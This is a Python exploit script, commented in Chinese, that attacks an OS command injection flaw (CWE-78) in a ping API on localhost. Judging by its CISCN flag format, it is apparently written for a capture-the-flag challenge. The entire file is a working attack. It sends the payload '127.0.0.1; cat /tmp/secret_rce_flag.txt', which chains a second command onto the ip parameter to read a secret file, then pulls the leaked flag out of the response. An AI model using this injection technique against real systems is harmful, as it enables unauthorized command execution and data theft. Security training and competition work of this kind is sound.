import requests
import time
import json
import urllib.parse
import logging

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

def run_exploit():
    """
    针对 CWE-78 (操作系统命令注入) 的自动化漏洞利用脚本
    """
    base_url = "http://127.0.0.1:18789/api/v1/ping"
    
    # 核心 Payload: 用分号截断 ping 命令，并执行我们自己的 cat 命令读取机密文件
    # 相当于让靶机执行：ping -c 1 127.0.0.1; cat /tmp/secret_rce_flag.txt
    payload = "127.0.0.1; cat /tmp/secret_rce_flag.txt"
    
    target_url = f"{base_url}?ip={urllib.parse.quote(payload)}"
    
    log_trace = f"[*] 漏洞锁定: CWE-78 系统命令注入\n"
    log_trace += f"[*] 发送恶意 Payload: {payload}\n"
    
    result = {
        "cve_id": "CWE-78",
        "vuln_name": "系统命令注入漏洞",
        "status": "failed",
        "risk_level": "critical",  # 命令执行是最高危漏洞！
        "leaked_data": None,
        "execution_log": "",
        "timestamp": int(time.time())
    }

    try:
        response = requests.get(target_url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            output = data.get("output", "")
            
            # 检查输出结果中是否包含了我们想要的 FLAG
            if "CISCN_FLAG" in output:
                # 提取出 FLAG (简单截取)
                flag_start = output.find("CISCN_FLAG{")
                flag = output[flag_start:].split("}")[0] + "}"
                
                log_trace += f"[+] 💥 漏洞利用成功！已获取系统底层执行权限！\n"
                log_trace += f"[+] 截获数据: {flag}\n"
                
                result["status"] = "success"
                result["leaked_data"] = flag
            else:
                log_trace += "[-] 注入失败，可能存在过滤。\n"
    except Exception as e:
        log_trace += f"[-] 错误: {str(e)}\n"
        
    result["execution_log"] = log_trace
    return result

if __name__ == "__main__":
    result = run_exploit()
    logger.info("命令注入攻击结果: %s", json.dumps(result, ensure_ascii=False))